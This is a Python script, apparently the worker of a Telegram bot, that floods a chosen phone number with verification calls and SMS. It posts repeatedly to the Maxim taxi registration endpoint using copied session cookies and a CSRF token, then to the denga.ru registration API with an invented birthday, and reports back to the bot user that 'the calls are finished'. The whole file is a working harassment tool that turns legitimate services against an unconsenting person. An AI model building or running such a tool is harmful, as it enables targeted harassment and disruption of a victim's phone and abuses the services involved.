import requests
import time
import telebot
import config

def main(number, userid):

    cookies = {
    'registration': 'nrqlhj3akc06f8nlehcqi77tkt',
    '__registration_tm_city_ru': '2890922763c18b53e43825107f521add48de5a97391a183fff9541fdbcff1c94a%3A2%3A%7Bi%3A0%3Bs%3A25%3A%22__registration_tm_city_ru%22%3Bi%3A1%3Bi%3A6%3B%7D',
    '__tracking_params': '8973dd09bc74d2febd44c36dbd1cb2862704f79df6a3b76624fd3a24dd2e0237a%3A2%3A%7Bi%3A0%3Bs%3A17%3A%22__tracking_params%22%3Bi%3A1%3Bs%3A139%3A%22%7B%22utm_content%22%3A%22goo-search%22%2C%22utm_source%22%3A%22google%22%2C%22utm_medium%22%3A%226727449311.82118122271.403967113341%22%2C%22utm_campaign%22%3A%22%E2%98%BB%5BRU%5D+%D0%9C%D0%BE%D1%81%D0%BA%D0%B2%D0%B0%22%7D%22%3B%7D',
    'drvCame': 'c99d7bb0d90fff6f7d97020e798564dbe98f11d8399ae861f1fa851c8e3bb6a9a%3A2%3A%7Bi%3A0%3Bs%3A7%3A%22drvCame%22%3Bi%3A1%3Bs%3A10%3A%22goo-search%22%3B%7D',
    '_csrf-registration': '24cdd150a518629bbd92c7af367b0e649f533f8ed64ededd5b103c7714042681a%3A2%3A%7Bi%3A0%3Bs%3A18%3A%22_csrf-registration%22%3Bi%3A1%3Bs%3A32%3A%22C-ts2oZxtx1OPL1PoK8xvgWpNqxEu4p4%22%3B%7D',
    '_ym_uid': '1628263174365136058',
    '_ym_d': '1628263174',
    '_gcl_aw': 'GCL.1628263171.Cj0KCQjwu7OIBhCsARIsALxCUaMgJEUI6BRGnjPldoNOCofStMuSGguWadt4ohtYy6YcSNlJ54i1XlcaAqi5EALw_wcB',
    '_gcl_au': '1.1.249506416.1628263174',
    '_ym_isad': '1',
    '_ym_visorc': 'w',
    'tmr_lvid': '165c8422defbf93cc85dd22ed61f8607',
    'tmr_lvidTS': '1628263174535',
    '_ga': 'GA1.2.718293692.1628263175',
    '_gid': 'GA1.2.1714839122.1628263175',
    '_gat_gtag_UA_74934112_11': '1',
    '_gat_UA-74934112-11': '1',
    'tmr_detect': '1%7C1628263174568',
    'ga4_ga': 'GA1.1.527731354.1628263171',
    'ga4_ga_21NZZ0KWNK': 'GS1.1.1628263170.1.1.1628263174.56',
    '_scid': 'a8b9eff3-a099-4bcc-a3f3-8230dfce1888',
    'tmr_reqNum': '3',
    '_sctr': '1|1628197200000',
	}

    headers = {
    'Connection': 'keep-alive',
    'sec-ch-ua': '"Chromium";v="92", " Not A;Brand";v="99", "Google Chrome";v="92"',
    'Accept': 'application/json, text/javascript, */*; q=0.01',
    'X-CSRF-Token': 'sFmm3G-O_6QDAOwN2ahrYoO3oiwrHBHv0H6tQBdtgfnzdNKvXeGl3Hd43UKJ5Foy7PyaVF17Rp-eD9UFYlnxzQ==',
    'X-Requested-With': 'XMLHttpRequest',
    'sec-ch-ua-mobile': '?0',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36',
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'Origin': 'https://registration.taxsee.com',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Dest': 'empty',
    'Referer': 'https://registration.taxsee.com/?app=maxim&intl=ru&b=6&utm_content=goo-search&utm_source=google&utm_medium=6727449311.82118122271.403967113341&utm_campaign=%E2%98%BB%5BRU%5D+%D0%9C%D0%BE%D1%81%D0%BA%D0%B2%D0%B0&_gl=1*io5yar*_gcl_aw*R0NMLjE2MjgyNjMxNzEuQ2owS0NRand1N09JQmhDc0FSSXNBTHhDVWFNZ0pFVUk2QlJHbmpQbGRvTk9Db2ZTdE11U0dndVdhZHQ0b2h0WXk2WWNTTmxKNTRpMVhsY2FBcWk1RUFMd193Y0I.*ga4_ga*NTI3NzMxMzU0LjE2MjgyNjMxNzE.*ga4_ga_21NZZ0KWNK*MTYyODI2MzE3MC4xLjAuMTYyODI2MzE3MC42MA..',
    'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
	}
    data = {
  '_csrf-registration': 'sFmm3G-O_6QDAOwN2ahrYoO3oiwrHBHv0H6tQBdtgfnzdNKvXeGl3Hd43UKJ5Foy7PyaVF17Rp-eD9UFYlnxzQ==',
  'RegistrationForm[place]': '6',
  'RegistrationForm[phone]': '+' + number,
  'RegistrationForm[phoneCountryCode]': 'ru',
  'RegistrationForm[appCode]': 'maxim',
  'RegistrationForm[udid]': 'a0911e42399c5a41295047f4e5be6c0f',
  'RegistrationForm[code]': ''
	}

    response1 = requests.post('https://registration.taxsee.com/ru/ru-RU/registration/send-code/', headers=headers, cookies=cookies, data=data)

    time.sleep(20)
    response1 = requests.post('https://registration.taxsee.com/ru/ru-RU/registration/send-code/', headers=headers, cookies=cookies, data=data)
	

    time.sleep(20)

    response1 = requests.post('https://registration.taxsee.com/ru/ru-RU/registration/send-code/', headers=headers, cookies=cookies, data=data)

	

    cookies = {
        '_ym_uid': '1629390472985512095',
        '_ym_d': '1629390472',
        '_ga': 'GA1.2.1531538991.1629390472',
        '_gid': 'GA1.2.996200401.1629390472',
        '_gat_gtag_UA_148869153_1': '1',
        '_ym_isad': '1',
        '_ym_visorc': 'w',
        '_dc_gtm_UA-137007978-1': '1',
        '_gat': '1',
        '_gat_UA-137007978-1': '1',
    }

    headers = {
        'Connection': 'keep-alive',
        'sec-ch-ua': '"Chromium";v="92", " Not A;Brand";v="99", "Google Chrome";v="92"',
        'Accept': 'application/json, text/plain, */*',
        'sec-ch-ua-mobile': '?0',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36',
        'Content-Type': 'application/json;charset=UTF-8',
        'Origin': 'https://lk.denga.ru',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Dest': 'empty',
        'Referer': 'https://lk.denga.ru/registration',
        'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
    }

    data = '{"phone":"+' + number + '","birthday":"1992-09-12"}'

    response2 = requests.post('https://lk.denga.ru/api/v1/auth/registration/phone/', headers=headers, cookies=cookies, data=data)

    bot = telebot.TeleBot(config.bot_token)
    bot.send_message(userid, "Звонки завершены!")